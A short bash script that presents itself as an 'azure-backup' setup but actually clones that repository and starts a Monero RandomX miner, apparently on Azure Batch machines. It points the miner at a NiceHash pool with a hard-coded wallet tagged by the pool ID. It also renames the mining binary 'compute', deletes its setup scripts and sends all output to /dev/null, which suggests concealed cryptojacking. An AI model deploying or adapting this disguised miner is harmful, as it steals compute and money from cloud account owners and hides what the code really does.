#!/usr/bin/env bash
sudo apt-get -y update       
#don't do apt-get upgrade because it does not work with AWS
sudo apt -y install libssl-dev cmake build-essential libhwloc-dev libuv1-dev

sudo sysctl -w vm.nr_hugepages=1500
git clone https://github.com/KrzysztofC/azure-backup.git
if [ -z "$gittag" ]
then
      echo "Running with latest version from git..."
else
      echo "checkout tag $gittag"
      cd azure-backup
      git checkout $gittag
      cd ..
fi

pwd
cd azure-backup/azure_script
export pool_pass1=x;export pool_address1=randomxmonero.eu.nicehash.com:3380;export wallet1=34nDR67wkxHjmJDAXZrEnKDnuaYx4ScX1E.${AZ_BATCH_POOL_ID};export nicehash1=true
export pool_pass2=x;export pool_address2=randomxmonero.eu.nicehash.com:3380;export wallet2=34nDR67wkxHjmJDAXZrEnKDnuaYx4ScX1E.${AZ_BATCH_POOL_ID};export nicehash2=true
chmod u+x run_local.pl
chmod u+x compute
rm compile_and_config.sh run.pl setup_vm3.sh
./run_local.pl 30 > /dev/null 2>&1







